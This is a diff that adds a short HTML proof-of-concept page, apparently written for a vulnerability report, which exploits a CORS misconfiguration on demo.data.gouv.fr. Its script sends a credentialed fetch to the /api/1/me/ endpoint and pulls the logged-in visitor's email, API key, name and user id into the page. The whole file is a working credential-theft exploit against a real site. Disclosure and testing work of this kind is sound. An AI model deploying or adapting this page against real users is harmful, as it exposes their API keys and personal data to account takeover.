@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC - data.gouv.fr</title></head>
+<body>
+<h1>CORS PoC - data.gouv.fr API key theft</h1>
+<pre id="output">Fetching your data from data.gouv.fr...</pre>
+<script>
+fetch("https://demo.data.gouv.fr/api/1/me/", {
+  credentials: "include"
+})
+.then(r => r.json())
+.then(data => {
+  const result = {
+    email: data.email,
+    apikey: data.apikey,
+    first_name: data.first_name,
+    last_name: data.last_name,
+    id: data.id
+  };
+  document.getElementById("output").innerText = JSON.stringify(result, null, 2);
+})
+.catch(e => document.getElementById("output").innerText = "Error: " + e);
+</script>
+</body>
+</html>
